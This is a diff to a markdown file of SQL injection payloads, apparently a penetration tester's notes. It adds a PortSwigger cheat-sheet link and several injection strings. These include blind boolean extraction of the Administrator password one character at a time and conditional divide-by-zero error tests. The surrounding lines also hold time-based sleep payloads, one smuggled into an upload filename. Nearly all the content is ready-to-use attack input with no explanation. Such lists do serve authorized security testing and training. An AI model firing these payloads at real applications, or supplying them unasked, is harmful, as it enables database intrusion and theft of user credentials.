@@ -1,6 +1,11 @@
 ## SQLi Payloads
 ___
 
+### External Links
+
+https://portswigger.net/web-security/sql-injection/cheat-sheet
+___
+
 ### Examples
 ```sql
 &topsort=flowers or sleep(3) >> Url
@@ -18,6 +23,12 @@ ___
 filename="poc.js' (select*from(select(sleep(3)))a) '.pdf" >> Uploading File
 
 asd</script>') UNION SELECT 1,SLEEP(10),3,4,5-- - >> Via file upload vulnerability
+
+xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm'--
+
+xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
+xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
+
 ```
 ### Determinig SQLi Vulnerablity & Login Bypass
 ```sql
